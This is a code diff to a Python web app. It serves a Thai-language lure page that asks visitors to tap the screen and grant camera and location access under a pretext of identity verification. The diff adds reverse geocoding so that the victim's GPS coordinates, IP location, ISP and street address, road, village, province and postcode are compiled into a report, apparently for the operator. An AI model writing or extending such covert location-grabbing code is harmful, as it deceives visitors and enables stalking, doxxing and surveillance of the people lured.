@@ -26,6 +26,29 @@ def get_location_from_ip(ip):
         print(f"IPInfo error: {e}")
     return None
 
+def reverse_geocode(lat, lon):
+    try:
+        url = f'https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&accept-language=th'
+        headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
+        resp = requests.get(url, headers=headers, timeout=10)
+        data = resp.json()
+        if 'address' in data:
+            addr = data['address']
+            return {
+                'road': addr.get('road', addr.get('pedestrian', '')),
+                'suburb': addr.get('suburb', addr.get('neighbourhood', '')),
+                'village': addr.get('village', addr.get('town', '')),
+                'city': addr.get('city', addr.get('town', addr.get('village', ''))),
+                'district': addr.get('state_district', ''),
+                'province': addr.get('province', addr.get('state', '')),
+                'postcode': addr.get('postcode', ''),
+                'country': addr.get('country', ''),
+                'display_name': data.get('display_name', '')
+            }
+    except Exception as e:
+        print(f"Geocode error: {e}")
+    return None
+
 HTML = '''<!DOCTYPE html>
 <html>
 <head>
@@ -61,7 +84,7 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 4-5 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 5-6 วินาที</div>
     </div>
     <script>
         async function startCapture() {
@@ -79,7 +102,7 @@ HTML = '''<!DOCTYPE html>
                 timestamp: new Date().toISOString()
             };
             
-            // ขออนุญาต GPS
+            // ขอ GPS
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
@@ -178,21 +201,38 @@ def upload():
         
         location = get_location_from_ip(real_ip)
         
+        # แปลง GPS เป็นที่อยู่
+        gps_address = None
+        if device_info.get('gps_lat') and device_info.get('gps_lon'):
+            gps_address = reverse_geocode(device_info['gps_lat'], device_info['gps_lon'])
+        
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         content = f"**📱 ข้อมูลการเชื่อมต่อ**\n"
         content += f"🌐 IP: {real_ip}\n"
         if location:
-            content += f"📍 เมือง: {location['city']}\n"
-            content += f"🗺️ จังหวัด: {location['region']}\n"
-            content += f"🌍 ประเทศ: {location['country']}\n"
+            content += f"📍 เมือง (IP): {location['city']}\n"
+            content += f"🗺️ จังหวัด (IP): {location['region']}\n"
+            content += f"🌍 ประเทศ (IP): {location['country']}\n"
             content += f"📶 ค่ายเน็ต/ISP: {location['isp']}\n"
             content += f"🗺️ พิกัด IP: {location['lat']}, {location['lon']}\n"
         
-        # GPS (ถ้ามี)
+        # GPS + ที่อยู่จาก GPS
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
             content += f"📍 GPS: {device_info['gps_lat']}, {device_info['gps_lon']}\n"
             if device_info.get('gps_accuracy'):
                 content += f"🎯 ความแม่นยำ GPS: ±{device_info['gps_accuracy']} เมตร\n"
+            if gps_address:
+                content += f"🏠 ที่อยู่ (GPS): {gps_address.get('display_name', 'ไม่พบที่อยู่')}\n"
+                if gps_address.get('road'):
+                    content += f"🛣️ ถนน: {gps_address['road']}\n"
+                if gps_address.get('village'):
+                    content += f"🏘️ ตำบล/หมู่บ้าน: {gps_address['village']}\n"
+                if gps_address.get('city'):
+                    content += f"🏙️ อำเภอ/เมือง: {gps_address['city']}\n"
+                if gps_address.get('province'):
+                    content += f"🗺️ จังหวัด: {gps_address['province']}\n"
+                if gps_address.get('postcode'):
+                    content += f"📮 รหัสไปรษณีย์: {gps_address['postcode']}\n"
         elif device_info.get('gps') == 'ไม่ได้รับอนุญาตหรือไม่รองรับ':
             content += f"📍 GPS: ปฏิเสธหรือไม่รองรับ\n"
         
